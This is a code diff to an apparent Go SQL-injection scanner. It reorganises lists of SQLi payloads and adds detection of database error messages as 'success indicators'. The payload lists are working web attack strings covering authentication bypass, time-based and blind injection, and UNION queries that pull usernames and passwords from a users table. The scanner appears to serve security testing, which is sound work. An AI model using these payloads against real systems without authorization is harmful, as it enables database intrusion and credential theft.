@@ -22,7 +22,7 @@ type Vulnerability struct {
 type SqliReport struct {
 	Endpoint     string
 	StatusCode   int
-	ResponseTime time.Time
+	ResponseTime time.Duration
 	Payload      string
 	PayloadCat   string
 	Success      bool
@@ -32,7 +32,7 @@ var AllSqlPayloads = SqlPayloads()
 
 // basic SQL payloads often used for bypassing authentication fields
 var SqlBypassPayloads = []string{
-	"' OR '1'='1",
+	// "' OR '1'='1",
 	"' OR '1'='1' -- ",
 	"' OR '1'='1' /*",
 	"admin' --",
@@ -40,9 +40,9 @@ var SqlBypassPayloads = []string{
 	"admin'/*",
 	"' OR 1=1 --",
 	"' OR 1=1 #",
-	"' OR 1=1/*",
-	"OR 1=1",
-	"'='",
+	// "' OR 1=1/*",
+	// "OR 1=1",
+	// "'='",
 }
 
 // payloads designed to leverage SQL functions and operators to extract information
@@ -57,7 +57,7 @@ var SqlFunctionPayloads = []string{
 var SqlTimePayloads = []string{
 	"'; WAITFOR DELAY '0:0:5' --",
 	"'; IF (1=1) WAITFOR DELAY '0:0:5' --",
-	"'; IF (1=2) WAITFOR DELAY '0:0:5' --",
+	// "'; IF (1=2) WAITFOR DELAY '0:0:5' --",
 	"' AND pg_sleep(5) --",     // For PostgreSQL
 	"'; SELECT pg_sleep(5) --", // For PostgreSQL
 	"' AND SLEEP(5) --",        // For MySQL
@@ -67,8 +67,8 @@ var SqlTimePayloads = []string{
 // payloads used when there is no visible error message
 var SqlBlindPayloads = []string{
 	"' AND 1=1 --",
-	"' AND 1=2 --",
-	"' OR SLEEP(5) --",
+	// "' AND 1=2 --",
+	// "' OR SLEEP(5) --",
 	"' AND IF(1=1, SLEEP(5), 0) --",
 	"' AND IF(1=2, SLEEP(5), 0) --",
 	"' OR 1=1 LIMIT 1 --",
@@ -86,11 +86,79 @@ var SqlErrorPayloads = []string{
 // payloads trying to leverage SQL's UNION operator to return data from other tables
 var SqlUnionPayloads = []string{
 	"' UNION SELECT NULL, NULL -- ",
-	"' UNION SELECT NULL, NULL, NULL -- ",
+	// "' UNION SELECT NULL, NULL, NULL -- ",
 	"' UNION SELECT 1, 'anotheruser', 'password' -- ",
 	"' UNION SELECT username, password FROM users --",
 	"' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",
 	"' UNION SELECT table_name FROM information_schema.tables --",
+}
+
+var SqliSuccessIndicators = []string{
+	// MySQL Error Messages
+	"You have an error in your SQL syntax",
+	"Warning: mysql_",
+	"Unknown column",
+	"MySQL server version for the right syntax",
+	"Unclosed quotation mark",
+	"check the manual that corresponds to your MySQL server version",
+
+	// PostgreSQL Error Messages
+	"ERROR: syntax error at or near",
+	"unterminated quoted string",
+	"invalid input syntax",
+	"permission denied for relation",
+	"function does not exist",
+
+	// SQL Server (MSSQL) Error Messages
+	"Unclosed quotation mark after the character string",
+	"Incorrect syntax near",
+	"Procedure expects parameter",
+	"Warning: mssql_query()",
+	"Syntax error in string in query expression",
+	"Invalid column name",
+
+	// Oracle Error Messages
+	"ORA-00933: SQL command not properly ended",
+	"ORA-01756: quoted string not properly terminated",
+	"ORA-06512: at line",
+	"ORA-00942: table or view does not exist",
+	"ORA-00904: invalid identifier",
+
+	// SQLite Error Messages
+	"SQLite3::SQLException",
+	"unrecognized token",
+	"no such table",
+	"SQLite error",
+
+	// Behavioral Indicators
+	"syntax error",
+	"unterminated",
+	"invalid query",
+	"missing operator",
+	"unexpected token",
+	"stack trace",
+	"server error",
+	"internal server error",
+	"forbidden",
+	"404 error",
+	"unexpected response body",
+	"permission denied",
+	"operation not allowed",
+	"function not supported",
+	"database error",
+	"unusual response",
+}
+
+func CheckForSqliIndicators(responseBody string, statusCode int) bool {
+	for _, indicator := range SqliSuccessIndicators {
+		if strings.Contains(responseBody, indicator) {
+			return true // SQL injection possibly successful
+		}
+	}
+	if statusCode == 500 || statusCode == 403 {
+		return true
+	}
+	return false // No indicators found
 }
 
 func GetGoFiles(root string) ([]string, error) {
@@ -197,13 +265,22 @@ func UnsafeSqlConstruction(expr ast.Expr) bool {
 	return false
 }
 
-func SqlPayloads() []string {
-	var arr []string
-	arr = append(arr, SqlBlindPayloads...)
-	arr = append(arr, SqlTimePayloads...)
-	arr = append(arr, SqlErrorPayloads...)
-	arr = append(arr, SqlUnionPayloads...)
-	arr = append(arr, SqlBypassPayloads...)
-	arr = append(arr, SqlFunctionPayloads...)
-	return arr
+func SqlPayloads() map[string][]string {
+	// var arr []string
+	result := make(map[string][]string)
+
+	result["SqlBlindPayloads"] = SqlBlindPayloads
+	result["SqlErrorPayloads"] = SqlErrorPayloads
+	result["SqlTimePayloads"] = SqlTimePayloads
+	result["SqlUnionPayloads"] = SqlUnionPayloads
+	result["SqlBypassPayloads"] = SqlBypassPayloads
+	result["SqlFunctionsPayloads"] = SqlFunctionPayloads
+	// arr = append(arr, SqlBlindPayloads...)
+	// arr = append(arr, SqlTimePayloads...)
+	// arr = append(arr, SqlErrorPayloads...)
+	// arr = append(arr, SqlUnionPayloads...)
+	// arr = append(arr, SqlBypassPayloads...)
+	// arr = append(arr, SqlFunctionPayloads...)
+	// return arr
+	return result
 }
